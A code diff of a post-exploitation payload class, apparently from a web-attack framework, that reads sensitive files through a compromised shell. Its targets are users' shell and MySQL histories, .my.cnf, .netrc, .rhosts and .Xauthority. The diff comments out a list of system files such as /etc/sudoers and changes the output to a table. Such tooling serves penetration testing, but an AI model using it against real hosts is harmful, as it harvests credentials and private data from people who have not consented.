@@ -1,68 +1,74 @@
-import re
 from plugins.attack.payloads.base_payload import base_payload
+from core.ui.consoleUi.tables import table
 
-class config_files(base_payload):
+
+class users_config_files(base_payload):
     '''
     This payload uses "users_folders" payload to find ".rc" and other configuration files, 
     some of them may contain sensitive information.
     '''
     def api_read(self):
         result = {}
-        config_files = []
+        user_config_files = []
         folders = self.exec_payload('users').values()
         for folder in folders:
-            config_files.append(folder+'.bashrc')
-            config_files.append(folder+'.bashrc~')
-            config_files.append(folder+'.bash_history')
-            config_files.append(folder+'.bash_profile')
-            config_files.append(folder+'.gtk-bookmarks')
-            config_files.append(folder+'.conkyrc')
-            config_files.append(folder+'.my.cnf')
-            config_files.append(folder+'.mysql_history.')
-            config_files.append(folder+'.ldaprc ')
-            config_files.append(folder+'.emacs')
-            config_files.append(folder+'.bash_logout')
-            config_files.append(folder+'.bash_login ')
-            config_files.append(folder+'.hushlogin')
-            config_files.append(folder+'.mail.rc')
-            config_files.append(folder+'.profile ')
-            config_files.append(folder+'.vimrc')
-            config_files.append(folder+'.gtkrc')
-            config_files.append(folder+'.kderc')
-            config_files.append(folder+'.netrc')
-            config_files.append(folder+'.rhosts')
-            config_files.append(folder+'.Xauthority')
-            config_files.append(folder+'.cshrc')
-            config_files.append(folder+'.login')
-            config_files.append(folder+'.joe_state')
+            user_config_files.append(folder+'.bashrc')
+            user_config_files.append(folder+'.bashrc~')
+            user_config_files.append(folder+'.bash_history')
+            user_config_files.append(folder+'.bash_profile')
+            user_config_files.append(folder+'.gtk-bookmarks')
+            user_config_files.append(folder+'.conkyrc')
+            user_config_files.append(folder+'.my.cnf')
+            user_config_files.append(folder+'.mysql_history.')
+            user_config_files.append(folder+'.ldaprc ')
+            user_config_files.append(folder+'.emacs')
+            user_config_files.append(folder+'.bash_logout')
+            user_config_files.append(folder+'.bash_login ')
+            user_config_files.append(folder+'.hushlogin')
+            user_config_files.append(folder+'.mail.rc')
+            user_config_files.append(folder+'.profile ')
+            user_config_files.append(folder+'.vimrc')
+            user_config_files.append(folder+'.gtkrc')
+            user_config_files.append(folder+'.kderc')
+            user_config_files.append(folder+'.netrc')
+            user_config_files.append(folder+'.rhosts')
+            user_config_files.append(folder+'.Xauthority')
+            user_config_files.append(folder+'.cshrc')
+            user_config_files.append(folder+'.login')
+            user_config_files.append(folder+'.joe_state')
             
 
-        config_files.append('/etc/sudoers')
-        config_files.append('/etc/inittab')
-        config_files.append('/etc/crontab')
-        config_files.append('/etc/sysctl.conf')
-        config_files.append('/etc/mailname')
-        config_files.append('/etc/aliases')
-        config_files.append('/etc/pam.conf')
-        #TODO PUT IN APACHE
-        config_files.append('/etc/libapache2-mod-jk/workers.properties')
+        #=======================================================================
+        # users_config_files.append('/etc/sudoers')
+        # users_config_files.append('/etc/inittab')
+        # users_config_files.append('/etc/crontab')
+        # users_config_files.append('/etc/sysctl.conf')
+        # users_config_files.append('/etc/mailname')
+        # users_config_files.append('/etc/aliases')
+        # users_config_files.append('/etc/pam.conf')
+        # #TODO PUT IN APACHE
+        # users_config_files.append('/etc/libapache2-mod-jk/workers.properties')
+        #=======================================================================
 
-        for file in config_files:
+        for file in user_config_files:
             content = self.shell.read(file)
             if content:
-                result.update({file:content})
+                result[ file ] = content
         return result
         
     def run_read(self):
-        hashmap = self.api_read()
-        result = []
+        api_result = self.api_read()
+                
+        if not api_result:
+            return 'No user configuration files found.'
+        else:
+            rows = []
+            rows.append( ['User configuration files',] )
+            rows.append( [] )
+            for filename in api_result:
+                rows.append( [filename,] )
+                    
+            result_table = table( rows )
+            result_table.draw( 80 )
+            return
         
-        for file, content in hashmap.iteritems():
-            result.append('-------------------------')
-            result.append(file)
-            result.append('-------------------------')
-            result.append(content)
-        
-        if result == [ ]:
-            result.append('Configuration files not found.')
-        return result
